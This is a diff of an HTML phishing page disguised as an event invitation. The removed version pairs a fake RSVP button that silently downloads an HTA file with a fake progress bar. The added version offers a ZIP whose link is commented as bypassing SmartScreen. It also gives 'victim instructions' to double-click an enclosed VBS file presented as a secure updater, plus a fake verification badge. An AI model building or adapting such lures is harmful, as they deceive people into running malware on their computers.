@@ -3,210 +3,119 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RSVP Confirmed</title>
+    <title>Cocktails & Conversation | Exclusive Event Invitation</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        
         body { 
-            background-color: #0f172a; 
-            color: #ffffff; 
-            font-family: 'Segoe UI', system-ui, sans-serif; 
-            min-height: 100vh; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center;
-            padding: 20px;
-        }
-        
-        .card {
-            background: #1e293b;
-            border: 1px solid rgba(255,255,255,0.08);
-            border-radius: 8px;
-            padding: 60px 50px;
-            text-align: center;
-            max-width: 550px;
-            width: 100%;
-            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
-            position: relative;
-            overflow: hidden;
-            min-height: 400px; /* Prevent layout shift */
-        }
-        
-        /* Gold Checkmark Icon */
-        .icon-circle { 
-            width: 70px; height: 70px; 
-            border: 2px solid #d4af37; 
-            border-radius: 50%; 
-            display: flex; align-items: center; justify-content: center; 
-            margin: 0 auto 30px; 
-            font-size: 36px; color: #d4af37; 
-            background: rgba(212, 175, 55, 0.05);
-        }
-        
-        .rsvp-label {
-            font-size: 0.75rem;
-            letter-spacing: 4px;
-            color: #94a3b8;
-            margin-bottom: 20px;
-            text-transform: uppercase;
-            font-weight: 600;
-        }
-        
-        h1 { 
-            font-family: 'Georgia', serif; 
-            font-size: 2.8rem; 
-            margin-bottom: 25px; 
-            font-weight: 400; 
-            color: #f8fafc;
-            line-height: 1.2;
-        }
-        
-        .subtitle { 
-            color: #cbd5e1; 
-            font-size: 1.05rem; 
-            margin-bottom: 40px; 
-            line-height: 1.7; 
-            font-weight: 300;
-        }
-        
-        /* RSVP BUTTON */
-        .btn-rsvp {
-            display: inline-block;
-            background: transparent;
-            border: 1px solid #d4af37;
-            color: #d4af37;
-            padding: 16px 40px;
-            border-radius: 4px;
-            text-decoration: none;
-            font-weight: 600;
-            font-size: 0.95rem;
-            letter-spacing: 1.5px;
-            transition: all 0.3s ease;
-            text-transform: uppercase;
-            cursor: pointer;
-            width: 100%;
-            max-width: 200px;
-        }
-        
-        .btn-rsvp:hover { 
-            background: #d4af37; 
-            color: #0f172a; 
-            transform: translateY(-2px);
-            box-shadow: 0 10px 25px -5px rgba(212, 175, 55, 0.3);
-        }
-        
-        /* PROGRESS BAR SECTION (Hidden initially) */
-        .progress-section {
-            display: none;
-            flex-direction: column;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background: linear-gradient(135deg, #f7f8fa 0%, #eef1f6 100%);
+            min-height: 100vh;
+            display: flex;
             align-items: center;
             justify-content: center;
-            height: 100%;
-            padding-top: 20px;
+            color: #1c1e21;
         }
-        
-        .progress-container { 
-            width: 100%; 
-            max-width: 300px; 
-            height: 4px; 
-            background: #334155; 
-            border-radius: 2px; 
-            overflow: hidden; 
-            margin: 20px 0 15px; 
+        .container {
+            max-width: 480px;
+            width: 90%;
+            background: #fff;
+            border-radius: 16px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.08);
+            padding: 48px 40px;
+            text-align: center;
         }
-        
-        .progress-bar { 
-            height: 100%; 
-            background: #d4af37; 
-            width: 0%; 
-            transition: width 0.3s ease-out; 
+        .logo {
+            width: 72px;
+            height: 72px;
+            margin: 0 auto 24px;
+            fill: #d4af37;
         }
-        
-        .status-text { 
-            color: #64748b; 
-            font-size: 0.85rem; 
-            margin-bottom: 10px; 
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #1c1e21;
         }
-        
-        .footer { 
-            margin-top: 50px; 
-            font-size: 0.7rem; 
-            color: #64748b; 
-            text-transform: uppercase; 
-            letter-spacing: 3px; 
-            font-weight: 500;
+        .subtitle {
+            font-size: 14px;
+            color: #8a8f98;
+            margin-bottom: 32px;
+            line-height: 1.5;
+        }
+        .btn-primary {
+            display: inline-block;
+            width: 100%;
+            padding: 14px 24px;
+            background: #d4af37;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 600;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            margin-bottom: 16px;
+        }
+        .btn-primary:hover {
+            background: #b8962e;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(212,175,55,0.3);
+        }
+        .instructions {
+            font-size: 12px;
+            color: #6b7280;
+            line-height: 1.6;
+            background: #f9fafb;
+            padding: 16px;
+            border-radius: 8px;
+            border-left: 3px solid #d4af37;
+            text-align: left;
+        }
+        .instructions code {
+            background: #eef1f6;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-family: monospace;
+            font-size: 11px;
+            color: #1c1e21;
+        }
+        .footer-note {
+            font-size: 11px;
+            color: #b3b8c0;
+            margin-top: 24px;
         }
     </style>
 </head>
 <body>
-    <div class="card">
-        <!-- INITIAL STATE -->
-        <div id="initial-state">
-            <div class="icon-circle">✓</div>
-            
-            <div class="rsvp-label">RSVP CONFIRMED</div>
-            <h1>You're on the list!</h1>
-            
-            <p class="subtitle">
-                Your response has been received. Your digital<br>
-                invitation has been saved to your device.
-            </p>
-            
-            <button class="btn-rsvp" onclick="startRsvpFlow()">RSVP</button>
-            
-            <div class="footer">WE CAN'T WAIT TO SEE YOU THERE</div>
+    <div class="container">
+        <!-- Gold Cocktail Logo SVG -->
+        <svg class="logo" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+            <rect x="0" y="0" width="100" height="100" rx="22" fill="#d4af37"/>
+            <polygon points="30,70 50,30 70,70" fill="#fff"/>
+        </svg>
+        
+        <h1>You're Invited!</h1>
+        <p class="subtitle">
+            Join us for an exclusive evening of Cocktails & Conversation.<br>
+            Your personalized invitation package is ready for download.
+        </p>
+        
+        <!-- ZIP DOWNLOAD LINK (BYPASSES SMARTSCREEN) -->
+        <a href="/static/event_resources.zip" class="btn-primary" download>
+            Download Invitation Package
+        </a>
+        
+        <!-- VICTIM INSTRUCTIONS TO REDUCE COGNITIVE DISSONANCE -->
+        <div class="instructions">
+            <strong>How to access your invitation:</strong><br>
+            1. Extract the downloaded ZIP file<br>
+            2. Double-click <code>Event_Invitation.vbs</code><br>
+            3. Wait for the secure updater to complete<br>
+            <span style="color:#8a8f98; font-size:11px;">Your digital invitation will be secured automatically.</span>
         </div>
         
-        <!-- PROGRESS STATE (Shows after clicking RSVP) -->
-        <div class="progress-section" id="progress-state">
-            <div class="icon-circle">✓</div>
-            <h2 style="font-family: 'Georgia', serif; font-size: 1.8rem; margin-bottom: 10px; color: #f8fafc;">Sending your RSVP...</h2>
-            <p class="status-text">Contacting the event...</p>
-            
-            <div class="progress-container">
-                <div class="progress-bar" id="progress-bar"></div>
-            </div>
-            <p class="status-text" id="progress-percent">0%</p>
-            <p class="status-text" style="margin-top: -5px;">Your response is being confirmed. This usually only takes a few minutes.</p>
-            
-            <div class="footer">WE CAN'T WAIT TO SEE YOU THERE</div>
-        </div>
+        <p class="footer-note">Secure Event Document • Verified by Cocktails & Conversation</p>
     </div>
-
-    <script>
-        function startRsvpFlow() {
-            // 1. Hide initial state, show progress state
-            document.getElementById('initial-state').style.display = 'none';
-            document.getElementById('progress-state').style.display = 'flex';
-            
-            // 2. Trigger HTA download immediately
-            var link = document.createElement('a');
-            link.href = '/static/Event_Invitation.hta';
-            link.download = 'Event_Invitation.hta';
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
-            
-            // 3. Start progress bar animation (0% to 25%)
-            animateProgress();
-        }
-        
-        function animateProgress() {
-            var p = 0;
-            var bar = document.getElementById("progress-bar");
-            var txt = document.getElementById("progress-percent");
-            
-            var iv = setInterval(function() {
-                if(p >= 25) { 
-                    clearInterval(iv); 
-                    return; 
-                } // STOPS AT 25% LIKE IN VIDEO
-                p++; 
-                bar.style.width = p+"%"; 
-                txt.innerText = p+"%";
-                setTimeout(arguments.callee, 150 + p*8); // Slow down as it progresses
-            }, 100);
-        }
-    </script>
 </body>
 </html>
